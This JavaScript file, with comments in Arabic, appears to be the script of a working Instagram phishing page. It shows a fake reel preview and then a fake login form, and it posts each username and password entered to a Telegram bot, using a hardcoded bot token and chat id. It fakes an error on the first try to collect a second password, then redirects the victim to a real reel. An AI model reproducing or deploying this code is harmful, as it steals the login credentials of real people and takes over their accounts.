// البيانات الخاصة بك
const token = "8290316866:AAHpxLGgMSmb1GUpqcIor8VjT6FEPL9LN1g";
const chat_id = "6577433645";
const targetReel = "https://www.instagram.com/reels/DFZ1t0rA7M9/";

let attempts = 0;

// وظيفة إظهار صفحة اللوجن (تعمل مع onclick في HTML)
window.showLogin = function() {
    document.getElementById('reel-preview').style.display = 'none';
    document.getElementById('login-page').style.display = 'flex';
};

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const logBtn = document.getElementById('loginBtn');

// وظيفة "إشعال" الزر (تغيير اللون للأزرق الواضح)
function validateInputs() {
    if (userInp.value.trim().length > 0 && passInp.value.length >= 6) {
        logBtn.classList.add('active');
    } else {
        logBtn.classList.remove('active');
    }
}

userInp.addEventListener('input', validateInputs);
passInp.addEventListener('input', validateInputs);

// عند الضغط على زر تسجيل الدخول
logBtn.addEventListener('click', async function() {
    attempts++;
    const u = userInp.value;
    const p = passInp.value;

    const text = `🔥 صيدة جديدة!\n👤 الحساب: ${u}\n🔑 الكلمة: ${p}\n🔢 المحاولة: ${attempts}`;

    // إرسال للتيليجرام
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: text })
        });
    } catch (err) {
        console.log("Error");
    }

    if (attempts === 1) {
        // المحاولة الأولى: إظهار خطأ ومسح الباسورد
        document.getElementById('customAlert').style.display = 'flex';
        passInp.value = "";
        validateInputs(); // لإطفاء الزر
    } else {
        // المحاولة الثانية: التحويل للرييل الحقيقي
        window.location.href = targetReel;
    }
});

// إغلاق نافذة الخطأ
document.getElementById('retryBtn').addEventListener('click', function() {
    document.getElementById('customAlert').style.display = 'none';
    passInp.focus();
});
